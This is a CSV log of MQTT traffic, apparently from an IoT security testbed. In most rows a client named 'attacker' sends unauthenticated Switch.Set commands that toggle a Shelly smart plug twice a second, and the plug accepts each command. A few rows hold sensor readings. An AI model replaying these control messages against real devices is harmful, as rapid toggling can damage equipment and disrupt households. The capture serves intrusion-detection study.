2026-04-22T16:37:42,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4983 34394.962 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:42,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:42,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:42,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4984 34395.443 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:42,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:42,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34395.44,""swi"
2026-04-22T16:37:42,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4985 34395.459 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:43,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:43,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4986 34395.943 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:43,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:43,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34395.94,""swi"
2026-04-22T16:37:43,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4987 34395.962 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:43,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:43,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:43,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4988 34396.444 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:43,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:43,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34396.44,""swi"
2026-04-22T16:37:43,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4989 34396.461 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:44,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:44,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4990 34396.945 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:44,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:44,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34396.94,""swi"
2026-04-22T16:37:44,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4991 34396.963 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:44,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:44,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:44,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4992 34397.448 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:44,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:44,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34397.44,""swi"
2026-04-22T16:37:44,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4993 34397.464 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:44,iot/pir/binary_sensor/motion/state,2,ON
2026-04-22T16:37:44,iot/pir/debug,49,[0;36m[D][binary_sensor:048]: 'Motion' >> ON[0m
2026-04-22T16:37:45,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:45,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4994 34397.946 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:45,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:45,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34397.94,""swi"
2026-04-22T16:37:45,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4995 34397.964 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:45,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:45,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:45,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:45,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:45,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4996 34398.447 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:45,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:45,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34398.44,""swi"
2026-04-22T16:37:45,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4997 34398.463 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:46,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:46,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4998 34398.948 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:46,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:46,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34398.95,""swi"
2026-04-22T16:37:46,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4999 34398.967 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:46,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:46,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:46,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5000 34399.448 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:46,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:46,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34399.45,""swi"
2026-04-22T16:37:46,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5001 34399.465 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:37:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:37:46,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:37:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:47,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:47,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5002 34399.948 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:47,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:47,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34399.95,""swi"
2026-04-22T16:37:47,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5003 34399.967 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:47,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:47,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:47,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5004 34400.449 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:47,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:47,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34400.45,""swi"
2026-04-22T16:37:47,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5005 34400.467 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:48,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:48,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5006 34400.950 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:48,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:48,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34400.95,""swi"
2026-04-22T16:37:48,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5007 34400.969 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:48,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:48,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:48,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5008 34401.450 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:48,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:48,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34401.45,""swi"
2026-04-22T16:37:48,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5009 34401.466 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:49,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:49,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5010 34401.950 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:49,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:49,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34401.95,""swi"
2026-04-22T16:37:49,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5011 34401.969 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:49,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:49,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:49,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5012 34402.451 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:49,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:49,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34402.45,""swi"
2026-04-22T16:37:49,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5013 34402.467 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:50,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:50,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5014 34402.955 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:50,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:50,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34402.95,""swi"
2026-04-22T16:37:50,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5015 34402.974 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:50,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:50,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:50,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:50,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:50,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5016 34403.456 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:50,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:50,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34403.45,""swi"
2026-04-22T16:37:50,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5017 34403.472 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:51,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:51,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5018 34403.956 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:51,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:51,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34403.95,""swi"
2026-04-22T16:37:51,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5019 34403.975 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:51,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:51,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:51,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5020 34404.457 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:51,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:51,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34404.45,""swi"
2026-04-22T16:37:51,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5021 34404.473 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:52,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:52,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5022 34404.961 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:52,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:52,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34404.96,""swi"
2026-04-22T16:37:52,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5023 34404.980 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:52,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:52,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:52,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5024 34405.458 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:52,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:52,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34405.46,""swi"
2026-04-22T16:37:52,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5025 34405.475 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:53,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:53,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5026 34405.959 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:53,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:53,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34405.96,""swi"
2026-04-22T16:37:53,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5027 34405.978 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:53,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:53,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:53,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5028 34406.459 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:53,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:53,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34406.46,""swi"
2026-04-22T16:37:53,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5029 34406.476 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:54,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:54,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5030 34406.960 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:54,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:54,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34406.96,""swi"
2026-04-22T16:37:54,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5031 34406.979 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:54,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:54,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:54,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5032 34407.464 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:54,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:54,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34407.46,""swi"
2026-04-22T16:37:54,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5033 34407.480 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:55,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:55,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5034 34407.960 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:55,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:55,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34407.96,""swi"
